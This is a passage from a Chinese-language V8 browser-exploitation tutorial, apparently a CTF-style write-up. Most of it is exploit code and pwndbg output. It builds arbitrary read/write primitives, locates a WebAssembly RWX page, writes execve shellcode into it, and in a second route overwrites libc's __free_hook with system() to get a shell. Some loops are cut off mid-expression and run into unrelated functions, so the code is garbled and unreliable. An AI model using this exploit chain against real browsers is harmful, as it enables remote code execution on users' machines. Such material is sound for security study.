    function write_dataview(fake_addr,fake_data){
        let buff_new = new ArrayBuffer(0x30);
        let dataview = new DataView(buff_new);
        let leak_buff = leak_obj(buff_new);
        let fake_write = leak_buff+0x20n;
        write_all(fake_write,fake_addr);
        dataview.setBigUint64(0,fake_data,true);
    }
而后就可以按照正常流程来读写利用了。
这里就介绍一种在浏览器中比较稳定利用的一个方式，利用`wasm`来劫持程序流。
### wasm劫持程序流：
在`v8`中，可以直接执行`wasm`中的字节码。有一个网站可以在线将C语言直接转换为wasm并生成JS调用代码：`https://wasdk.github.io/WasmFiddle`。
左侧是c语言，右侧是`js`代码，选`Code Buffer`模式，点`build`编译，左下角生成的就是`wasm code`。
有限的是c语言部分只能写一些很简单的`return`功能。多了赋值等操作就会报错。但是也足够了。
将上面生成的代码测试一下：
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var f = wasmInstance.exports.main;
    var leak_f = leak_obj(f);
    //console.log('0x'+leak_f.toString(16));
    console.log(f());
    %DebugPrint(test);
    %SystemBreak();
会得到`42`的结果，那么我们很容易就能想到，如果用任意写的功能，将`wasm`中的可执行区域写入`shellcode`呢？
我们需要找到可执行区域的字段。
直接给出字段：
    Function–>shared_info–>WasmExportedFunctionData–>instance
在空间中的显示：
    Function:
    pwndbg> x/10xg 0x144056c21f31-1
    0x144056c21f30: 0x00002ab4903c4379  0x00003de1f2ac0c71
    0x144056c21f40: 0x00003de1f2ac0c71  0x0000144056c21ef9   --> shared_info
    0x144056c21f50: 0x0000144056c01869  0x000001a263740699
    0x144056c21f60: 0x00001defa6dc2001  0x00003de1f2ac0bc1
    0x144056c21f70: 0x0000000400000000  0x0000000000000000
    shared_info:
    pwndbg> x/10xg 0x0000144056c21ef9-1
    0x144056c21ef8: 0x00003de1f2ac09e1  0x0000144056c21ed1   --> WasmExportedFunctionData
    0x144056c21f08: 0x00003de1f2ac4ae1  0x00003de1f2ac2a39
    0x144056c21f18: 0x00003de1f2ac04d1  0x0000000000000000
    0x144056c21f28: 0x0000000000000000  0x00002ab4903c4379
    0x144056c21f38: 0x00003de1f2ac0c71  0x00003de1f2ac0c71
    WasmExportedFunctionData:
    pwndbg> x/10xg 0x0000144056c21ed1-1
    0x144056c21ed0: 0x00003de1f2ac5879  0x00001defa6dc2001
    0x144056c21ee0: 0x0000144056c21d39   --> instance    0x0000000000000000
    0x144056c21ef0: 0x0000000000000000  0x00003de1f2ac09e1
    0x144056c21f00: 0x0000144056c21ed1  0x00003de1f2ac4ae1
    0x144056c21f10: 0x00003de1f2ac2a39  0x00003de1f2ac04d1
    instance+0x88:
    pwndbg> telescope 0x0000144056c21d39-1+0x88
    00:0000│   0x144056c21dc0 —? 0x27860927e000 ?— movabs r10, 0x27860927e260 /* 0x27860927e260ba49 */       --> 可执行地址
    01:0008│   0x144056c21dc8 —? 0x2649b9fd0251 ?— 0x7100002ab4903c91
    02:0010│   0x144056c21dd0 —? 0x2649b9fd0489 ?— 0x7100002ab4903cad
    03:0018│   0x144056c21dd8 —? 0x144056c01869 ?— 0x3de1f2ac0f
    04:0020│   0x144056c21de0 —? 0x144056c21e61 ?— 0x7100002ab4903ca1
    05:0028│   0x144056c21de8 —? 0x3de1f2ac04d1 ?— 0x3de1f2ac05
    pwndbg> vmmap 0x27860927e000
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x27860927e000     0x27860927f000 rwxp     1000 0
可得知`0x144056c21dc0`处的`0x27860927e000`为可执行区域，那么只需要将`0x144056c21dc0`处的内容读取出来，在将`shellcode`写入读取出来的地址处即可完成程序流劫持：
    var data1 = read_all(leak_f+0x18n);
    var data2 = read_all(data1+0x8n);
    var data3 = read_all(data2+0x10n);
    var data4 = read_all(data3+0x88n);
    //console.log('0x'+data4.toString(16));
    let buff_new = new ArrayBuffer(0x100);
    let dataview = new DataView(buff_new);
    let leak_buff = leak_obj(buff_new);
    let fake_write = leak_buff+0x20n;
    write_all(fake_write,data4);
    var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
    for(var i=0;i>16n;
        return test_fake;
    }
    function write_system_addr(leak_test_addr){
        var elf_base = leak_test_addr - 11359456n;
        console.log("[*] leak elf base success: 0x"+elf_base.toString(16));
        var puts_got = elf_base + 0xD9A3B8n;
        puts_got = read_all(puts_got+1n);
        console.log("[*] leak puts got success: 0x"+puts_got.toString(16));
        var libc_base = puts_got - 456336n;
        console.log("[*] leak libc base success: 0x"+libc_base.toString(16));
        var free_hook = libc_base + 3958696n;
        console.log("[*] leak __free_hook success: 0x"+free_hook.toString(16));
        var one_gadget = libc_base + 0x4526an;
        console.log("[*] leak one_gadget success: 0x"+one_gadget.toString(16));
        var system_addr = libc_base + 283536n;
        write_dataview(free_hook,system_addr);
    }
    function get_shell(){
        var bufff = new ArrayBuffer(0x10);
        var dataa = new DataView(bufff);
        dataa.setBigUint64(0,0x0068732f6e69622fn,true);
    }
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var f = wasmInstance.exports.main;
    var leak_f = leak_obj(f);
    //console.log('0x'+leak_f.toString(16));
    //console.log(f());
    //%DebugPrint(f);
    //%SystemBreak();
    var data1 = read_all(leak_f+0x18n);
    var data2 = read_all(data1+0x8n);
    var data3 = read_all(data2+0x10n);
    var data4 = read_all(data3+0x88n);
    //console.log('0x'+data4.toString(16));
    let buff_new = new ArrayBuffer(0x100);
    let dataview = new DataView(buff_new);
    let leak_buff = leak_obj(buff_new);
    let fake_write = leak_buff+0x20n;
    write_all(fake_write,data4);
    var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
    for(var i=0;i
  2. 
* * *